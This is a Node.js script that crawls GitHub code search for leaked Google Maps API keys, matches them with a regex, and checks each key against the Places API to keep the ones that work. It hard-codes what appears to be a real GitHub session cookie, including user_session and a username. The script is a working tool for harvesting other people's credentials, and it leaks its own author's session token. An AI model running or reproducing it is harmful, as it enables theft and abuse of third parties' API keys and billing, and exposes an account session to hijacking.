request = require("request");
fs = require("fs");

keys = new Set();

queue = JSON.parse(fs.readFileSync("keys").toString());

for(var key of queue) {
	keys.add(key);
}

function parse(page) {

	console.log(page)

	opt = {};

	opt.url = "https://github.com/search?p="+page+"&q=https://maps.googleapis.com/maps/api/place/details/json?key&type=Code&utf8=?&_pjax=";
	opt.method = "GET";
	opt.headers = {
	"Accept": "text/html",
	"Accept-Language": "fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3",
	"Cache-Control": "no-cache",
	"Connection": "keep-alive",
	"Cookie": "logged_in=yes; _ga=GA1.2.1134776994.1477509078; _octo=GH1.1.910557402.1477509078; user_session=s7STwsCul4r9wOBTFeGyIRN9tYcTpaFd3RSr3pOB7O1TLIHp; __Host-user_session_same_site=s7STwsCul4r9wOBTFeGyIRN9tYcTpaFd3RSr3pOB7O1TLIHp; dotcom_user=benjaminchazelle; _gh_sess=ZytjOWdpKzQwZVNibFRwNXNmdlVoZmczUHVnbEZyU0h0a1Y5cDd5S05RaFBCcnVNK2VPTzFDRXVpcjNDRHowVEpzR1N1UW1Ib1NiU1NEOTVnZTVuTnQrL29yVE9xRmpFOVA2bjljdjFTQ05hRHR2R0ltUEQ4bDRHR0NKZ2JXY1c0N0JLZzBka2V6aytYbVBOalBVR1ZBPT0tLVdiaWVadGVjd0h4Q2ZEaWRBNjFaOWc9PQ%3D%3D--460dda99536efd4636d56f487a7937822140887d; tz=Europe%2FParis; _gat=1",
	"DNT": "1",
	"origin": "https://github.com",
	"Pragma": "no-cache",
	"Referer": "https://github.com/search?p=14&q=https%3A%2F%2Fmaps.googleapis.com%2Fmaps%2Fapi%2Fplace%2Fdetails%2Fjson%3Fkey&type=Code&utf8=%E2%9C%93&_pjax=%23js-pjax-container",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
	"x-pjax": "true",
	"x-pjax-container": "#js-pjax-container",
	"x-requested-with": "XMLHttpRequest",
	};

	request(opt, function(a,b,c) {
		
		if(b != null && b.body != null) {		
			var matches = b.body.match(/AIzaSy[A-Za-z0-9_-]{33}/gm);
			if(matches != null) {
			for(key of matches) {
				keys.add(key);
			}					
			}

		}
		
		if(page < 600) {
			setTimeout(parse, 200, (page+1));
		} else {
			fs.writeFileSync("keys", JSON.stringify(Array.from(keys), null, 4));
		}
			
	});

}

//parse(200)

var validKeys = [];

function check() {

if(queue.length == 0) {
	return fs.writeFileSync("validkeys", JSON.stringify(validKeys, null, 4));
}

var key = queue.pop();

console.log("Key checking : ", queue.length);

request({url : "https://maps.googleapis.com/maps/api/place/details/json?placeid=ChIJN1t_tDeuEmsRUsoyG83frY4&key=" + key}, function (error, response, body) {
	
	if(response != null && response.body != null && JSON.parse(response.body).status == "OK") {
		validKeys.push(key);
	}
	
	console.log(JSON.parse(response.body).status);
	
	check();
});

}

check();